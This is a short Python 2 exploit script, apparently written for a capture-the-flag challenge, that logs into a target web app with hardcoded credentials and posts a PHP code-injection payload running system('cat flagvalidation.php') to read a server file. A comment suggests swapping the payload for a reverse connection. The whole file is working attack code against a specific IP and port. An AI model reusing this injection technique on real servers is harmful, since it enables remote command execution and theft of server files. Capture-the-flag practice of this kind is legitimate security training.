#! /usr/bin/python
# Simple Exploit of esecurify CTF Challenge by Vyshnav
# Usage:python esecurity_exploit.py http://167.71.224.201:1337 CTF Crack#@Me!

import requests
import sys
from bs4 import BeautifulSoup as bs
url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
#ip_adress= sys.argv[4]--->Change the payload and open these ports and ip , if you need Reverse connection!!!!
#port = sys.argv[5]

s=requests.Session()
log_in={
'pass':'Crack#@Me!',
'username':'CTF',
}
login_page = s.post(url+'/index.php',data=log_in)
print login_page
print "esecurity CTF Simple FLAG Exploit"
print "[*][*] Login Done Successully"

payload ={
'message':'system("cat flagvalidation.php");',
}

execute_payload=s.post(url+"/challenge2.php",data=payload)
s=bs(execute_payload.content,'lxml')
print "[*][*] Payload Executed Sucesfully"
print "[*][*]Check the Source Code"
print s
